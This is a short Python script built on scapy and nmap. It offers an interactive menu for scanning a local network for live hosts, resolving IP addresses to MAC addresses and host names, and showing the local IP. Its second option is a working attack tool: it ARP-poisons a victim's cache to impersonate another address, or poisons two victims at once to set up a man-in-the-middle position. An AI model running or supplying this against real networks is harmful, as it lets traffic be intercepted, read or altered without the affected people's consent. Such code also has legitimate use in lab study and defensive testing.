from scapy.all import *
import nmap
import socket

def main():
    choice = -1
    nm = nmap.PortScanner()
    while choice != 0:
        print("Main Menu: \n0 - Quit\n1 - View active hosts on LAN\n2 - Craft and send ARP packet\n3 - Obtain MAC address of given IP\n4 - Localhost IP\n")
        choice = input("Pick option: ")
        match (int(choice)):
            case 0:
                print("Exiting program . . .\n")
                break
            case 1:
                net = input("Input IP range: ")
                nm.scan(net, arguments="-sn")
                for host in nm.all_hosts():
                    print(f"Host: {host}\n")
            case 2:
                print("Options:\n1 - ARP poison target machine cache\n2 - ARP poison two victims (mitm attack)\n")
                arp_select = int(input("Select option: "))
                if arp_select == 1:
                    poison = input("Enter victim IP: ")
                    atk = input("Enter IP to impersonate: ")
                    arpcachepoison(poison, atk) #scapy built in module
                elif arp_select == 2:
                    poison = input("Enter victim IP 1: ")
                    atk = input("Enter victim IP 2: ")
                    arp_mitm(poison, atk) #scapy built in module
                else:
                    print("Invalid option.")
            case 3:
                target = input("Enter target IP: ")
                answered, unanswered = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)), timeout=1)
                for sent, rcv in answered:
                    print(f"Target IP: {rcv.psrc}, Target MAC: {rcv.hwsrc}") #Target Host Name: {socket.gethostbyaddr(rcv.psrc)[0]}
                    try:
                        h_name = socket.gethostbyaddr(rcv.psrc)[0]
                    except:
                        print("Target Name: No name found.\n")
                    else:
                        print(f"Target Name: {h_name}\n")
            case 4:
                host_name = socket.gethostname()
                host_ip = socket.gethostbyname(host_name)
                print(f"Host Name: {host_name} Host IP: {host_ip}\n") #socket.gethostbyname('localhost')
                

if __name__ == "__main__":
    main()